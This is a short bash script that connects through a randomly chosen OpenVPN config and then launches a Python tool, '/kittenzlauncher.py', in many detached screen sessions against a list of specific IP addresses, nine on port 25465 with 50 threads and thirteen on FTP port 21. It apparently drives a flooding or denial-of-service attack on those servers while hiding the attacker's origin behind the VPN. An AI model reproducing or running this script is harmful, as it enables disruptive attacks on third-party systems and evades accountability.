#!/bin/bash
#yum install nano unzip screen python-argparse epel-release -y; yum install openvpn -y

files=(/ovpn_tcp/*)
config="${files[RANDOM % ${#files[@]}]}"
killall python
killall python
killall openvpn
killall openvpn
screen -dmS vpn openvpn --config $config


#multi
screen -dmS a python /kittenzlauncher.py -p -t 50 25465 107.174.19.150
screen -dmS b python /kittenzlauncher.py -p -t 50 25465 107.174.19.154
screen -dmS c python /kittenzlauncher.py -p -t 50 25465 176.31.103.7
screen -dmS d python /kittenzlauncher.py -p -t 50 25465 45.35.54.3
screen -dmS e python /kittenzlauncher.py -p -t 50 25465 45.35.54.5
screen -dmS f python /kittenzlauncher.py -p -t 50 25465 45.35.54.52
screen -dmS g python /kittenzlauncher.py -p -t 50 25465 45.35.54.55
screen -dmS h python /kittenzlauncher.py -p -t 50 25465 45.35.54.57
screen -dmS i python /kittenzlauncher.py -p -t 50 25465 45.35.54.118


#ftp
screen -dmS j python /kittenzlauncher.py -p 21 -t 5 107.174.19.150
screen -dmS k python /kittenzlauncher.py -p 21 -t 5 107.174.19.154
screen -dmS l python /kittenzlauncher.py -p 21 -t 5 176.31.103.7
screen -dmS m python /kittenzlauncher.py -p 21 -t 5 176.31.103.228
screen -dmS n python /kittenzlauncher.py -p 21 -t 5 45.35.54.3
screen -dmS o python /kittenzlauncher.py -p 21 -t 5 45.35.54.5
screen -dmS p python /kittenzlauncher.py -p 21 -t 5 45.35.54.14
screen -dmS q python /kittenzlauncher.py -p 21 -t 5 45.35.54.35
screen -dmS r python /kittenzlauncher.py -p 21 -t 5 45.35.54.52
screen -dmS s python /kittenzlauncher.py -p 21 -t 5 45.35.54.55
screen -dmS t python /kittenzlauncher.py -p 21 -t 5 45.35.54.57
screen -dmS u python /kittenzlauncher.py -p 21 -t 5 45.35.54.77
screen -dmS v python /kittenzlauncher.py -p 21 -t 5 45.35.54.118
